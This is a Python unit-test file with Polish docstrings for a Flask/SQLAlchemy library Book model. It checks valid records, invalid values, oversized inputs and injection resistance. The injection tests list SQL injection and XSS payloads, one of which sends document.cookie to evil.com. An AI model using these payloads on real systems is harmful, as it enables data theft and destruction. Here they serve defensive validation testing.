import unittest
from project import app, db
from project.books.models import Book


class TestBookModel(unittest.TestCase):

    def setUp(self):
        app.config['TESTING'] = True
        app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///:memory:'
        self.app_context = app.app_context()
        self.app_context.push()
        db.create_all()

    def tearDown(self):
        db.session.remove()
        db.drop_all()
        self.app_context.pop()

    # =========================================================================
    # 1. TESTY POPRAWNYCH DANYCH
    # =========================================================================

    def test_valid_book_creation_default_status(self):
        """Test tworzenia obiektu Book z poprawnymi danymi i domyślnym statusem."""
        book = Book(
            name="Wiedźmin: Ostatnie życzenie",
            author="Andrzej Sapkowski",
            year_published=1993,
            book_type="5days"
        )
        db.session.add(book)
        db.session.commit()

        self.assertIsNotNone(book.id)
        self.assertEqual(book.name, "Wiedźmin: Ostatnie życzenie")
        self.assertEqual(book.author, "Andrzej Sapkowski")
        self.assertEqual(book.year_published, 1993)
        self.assertEqual(book.book_type, "5days")
        self.assertEqual(book.status, "available")

    def test_valid_book_creation_custom_status(self):
        """Test tworzenia obiektu Book ze wszystkimi poprawnymi parametrami (w tym własnym statusem)."""
        book = Book(
            name="Clean Code",
            author="Robert C. Martin",
            year_published=2008,
            book_type="10days",
            status="loaned"
        )
        db.session.add(book)
        db.session.commit()

        self.assertEqual(book.name, "Clean Code")
        self.assertEqual(book.author, "Robert C. Martin")
        self.assertEqual(book.year_published, 2008)
        self.assertEqual(book.book_type, "10days")
        self.assertEqual(book.status, "loaned")

    def test_valid_book_repr(self):
        """Test poprawnej reprezentacji tekstowej (__repr__) obiektu Book."""
        book = Book(
            name="Hobbit",
            author="J.R.R. Tolkien",
            year_published=1937,
            book_type="2days"
        )
        db.session.add(book)
        db.session.commit()

        expected_repr = f"Book(ID: {book.id}, Name: Hobbit, Author: J.R.R. Tolkien, Year Published: 1937, Type: 2days, Status: available)"
        self.assertEqual(repr(book), expected_repr)

    def test_valid_book_all_allowed_types(self):
        """Test tworzenia książek dla wszystkich dozwolonych typów wypożyczeń (2days, 5days, 10days)."""
        allowed_types = ["2days", "5days", "10days"]
        for idx, b_type in enumerate(allowed_types):
            book = Book(
                name=f"Book Title {idx}",
                author="Jan Kowalski",
                year_published=2020,
                book_type=b_type
            )
            db.session.add(book)
            db.session.commit()
            self.assertEqual(book.book_type, b_type)

    # =========================================================================
    # 2. TESTY NIEPOPRAWNYCH DANYCH
    # =========================================================================

    def test_invalid_empty_name(self):
        """Test tworzenia książki z pustym tytułem - powinno rzucić wyjątek ValueError."""
        with self.assertRaises(ValueError):
            book = Book(
                name="",
                author="Adam Mickiewicz",
                year_published=1834,
                book_type="5days"
            )
            db.session.add(book)
            db.session.commit()

    def test_invalid_none_values(self):
        """Test tworzenia książki z wartościami None dla wymaganych pól."""
        with self.assertRaises((ValueError, TypeError)):
            book = Book(
                name=None,
                author=None,
                year_published=None,
                book_type=None
            )
            db.session.add(book)
            db.session.commit()

    def test_invalid_year_type_string(self):
        """Test podania tekstu zamiast liczby w polu year_published."""
        with self.assertRaises((ValueError, TypeError)):
            book = Book(
                name="Pan Tadeusz",
                author="Adam Mickiewicz",
                year_published="tysiąc osiemset trzydzieści cztery",
                book_type="5days"
            )
            db.session.add(book)
            db.session.commit()

    def test_invalid_negative_year(self):
        """Test podania ujemnego roku wydania."""
        with self.assertRaises(ValueError):
            book = Book(
                name="Starożytna Księga",
                author="Nieznany",
                year_published=-500,
                book_type="5days"
            )
            db.session.add(book)
            db.session.commit()

    def test_invalid_future_year(self):
        """Test podania roku wydania z dalekiej przyszłości."""
        with self.assertRaises(ValueError):
            book = Book(
                name="Książka z przyszłości",
                author="Autor Przyszłości",
                year_published=3050,
                book_type="5days"
            )
            db.session.add(book)
            db.session.commit()

    def test_invalid_book_type(self):
        """Test podania niedozwolonego typu książki (spoza listy 2days, 5days, 10days)."""
        with self.assertRaises(ValueError):
            book = Book(
                name="Testowa Książka",
                author="Autor Testowy",
                year_published=2021,
                book_type="365days"
            )
            db.session.add(book)
            db.session.commit()

    def test_invalid_author_type_number(self):
        """Test podania liczby zamiast ciągu znaków jako autora."""
        with self.assertRaises((ValueError, TypeError)):
            book = Book(
                name="Książka",
                author=123456,
                year_published=2020,
                book_type="2days"
            )
            db.session.add(book)
            db.session.commit()

    def test_invalid_duplicate_book_name(self):
        """Test naruszenia unikalności nazwy książki w bazie danych."""
        book1 = Book(name="Unikalna Książka", author="Autor 1", year_published=2020, book_type="2days")
        book2 = Book(name="Unikalna Książka", author="Autor 2", year_published=2021, book_type="5days")
        db.session.add(book1)
        db.session.commit()

        with self.assertRaises(Exception):
            db.session.add(book2)
            db.session.commit()

    # =========================================================================
    # 3. TESTY ZWIĄZANE Z PRÓBĄ WSTRZYKNIĘCIA KODU SQL I JAVASCRIPT
    # =========================================================================

    def test_sql_injection_in_name(self):
        """Test odporności pola name na wstrzyknięcie kodu SQL (SQL Injection)."""
        sql_payloads = [
            "'; DROP TABLE books; --",
            "' OR '1'='1",
            "admin'--",
            "1; SELECT * FROM customers; --",
            "' UNION SELECT username, password FROM users--"
        ]
        for payload in sql_payloads:
            with self.subTest(payload=payload):
                with self.assertRaises(ValueError):
                    book = Book(
                        name=payload,
                        author="Jan Kowalski",
                        year_published=2022,
                        book_type="5days"
                    )
                    db.session.add(book)
                    db.session.commit()

    def test_sql_injection_in_author(self):
        """Test odporności pola author na wstrzyknięcie kodu SQL (SQL Injection)."""
        sql_payload = "Robert'); DROP TABLE books;--"
        with self.assertRaises(ValueError):
            book = Book(
                name="Bezpieczna Książka",
                author=sql_payload,
                year_published=2022,
                book_type="5days"
            )
            db.session.add(book)
            db.session.commit()

    def test_javascript_injection_xss_in_name(self):
        """Test odporności pola name na wstrzyknięcie kodu JavaScript (XSS)."""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(document.cookie)",
            "<svg/onload=alert('XSS')>",
            "<body onload=alert('test')>"
        ]
        for payload in xss_payloads:
            with self.subTest(payload=payload):
                with self.assertRaises(ValueError):
                    book = Book(
                        name=payload,
                        author="Jan Kowalski",
                        year_published=2022,
                        book_type="5days"
                    )
                    db.session.add(book)
                    db.session.commit()

    def test_javascript_injection_xss_in_author(self):
        """Test odporności pola author na wstrzyknięcie kodu JavaScript (XSS)."""
        xss_payload = "<script>fetch('http://evil.com?c=' + document.cookie)</script>"
        with self.assertRaises(ValueError):
            book = Book(
                name="Książka XSS",
                author=xss_payload,
                year_published=2022,
                book_type="5days"
            )
            db.session.add(book)
            db.session.commit()

    # =========================================================================
    # 4. TESTY EKSTREMALNE
    # =========================================================================

    def test_extreme_long_name_exceeding_column_limit(self):
        """Test przekroczenia maksymalnej długości pola name (String(64)) - bardzo długi ciąg znaków."""
        extreme_name = "A" * 10000
        with self.assertRaises(ValueError):
            book = Book(
                name=extreme_name,
                author="Jan Kowalski",
                year_published=2020,
                book_type="5days"
            )
            db.session.add(book)
            db.session.commit()

    def test_extreme_long_author_exceeding_column_limit(self):
        """Test przekroczenia maksymalnej długości pola author (String(64)) - 100 000 znaków."""
        extreme_author = "B" * 100000
        with self.assertRaises(ValueError):
            book = Book(
                name="Normalny Tytuł",
                author=extreme_author,
                year_published=2020,
                book_type="5days"
            )
            db.session.add(book)
            db.session.commit()

    def test_extreme_year_max_integer(self):
        """Test ekstremalnie dużej wartości liczbowej dla roku wydania."""
        with self.assertRaises((ValueError, OverflowError)):
            book = Book(
                name="Książka Ekstremalna",
                author="Autor",
                year_published=999999999999999999999999999999,
                book_type="5days"
            )
            db.session.add(book)
            db.session.commit()

    def test_extreme_year_min_integer(self):
        """Test ekstremalnie małej (ujemnej) wartości liczbowej dla roku wydania."""
        with self.assertRaises((ValueError, OverflowError)):
            book = Book(
                name="Książka Ekstremalna Ujemna",
                author="Autor",
                year_published=-999999999999999999999999999999,
                book_type="5days"
            )
            db.session.add(book)
            db.session.commit()

    def test_extreme_special_and_control_characters(self):
        """Test znaków specjalnych, bajtów zerowych (null byte) oraz znaków kontrolnych."""
        extreme_string = "\x00\x01\x02\n\r\t\b\x7f" * 50
        with self.assertRaises(ValueError):
            book = Book(
                name=extreme_string,
                author=extreme_string,
                year_published=2020,
                book_type="5days"
            )
            db.session.add(book)
            db.session.commit()

    def test_extreme_whitespace_only_fields(self):
        """Test pól wypełnionych wyłącznie białymi znakami (spacje, tabulatory, nowe linie)."""
        with self.assertRaises(ValueError):
            book = Book(
                name="     \t\n   ",
                author="   \n\t     ",
                year_published=2020,
                book_type="5days"
            )
            db.session.add(book)
            db.session.commit()


if __name__ == '__main__':
    unittest.main()
